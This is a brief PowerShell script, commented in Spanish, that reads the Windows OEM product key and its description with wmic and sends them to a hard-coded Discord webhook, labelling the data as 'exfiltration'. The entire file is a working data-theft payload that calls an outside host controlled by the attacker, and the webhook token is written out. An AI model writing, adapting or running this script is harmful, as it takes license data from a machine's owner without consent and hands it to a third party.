# Definir la URL del webhook de Discord
$hookUrl = "https://discord.com/api/webhooks/1264728039682740356/RjUIrKfIKnpBH3npIAWT-M7YZ0KfwCzVmkgGp8yF2Bv3hagAgVVdSucimNeswCoiStR3"

# Obtener la clave de producto y la descripción
$exfiltration = @"
$(wmic path softwarelicensingservice get OA3xOriginalProductKey)
$(wmic path softwarelicensingservice get OA3xOriginalProductKeyDescription)
"@

# Crear el payload para el webhook
$payload = [PSCustomObject]@{
    content = $exfiltration
}

# Enviar la información al webhook de Discord
Invoke-RestMethod -Uri $hookUrl -Method Post -Body ($payload | ConvertTo-Json) -ContentType 'Application/Json'

# Salir del script
exit
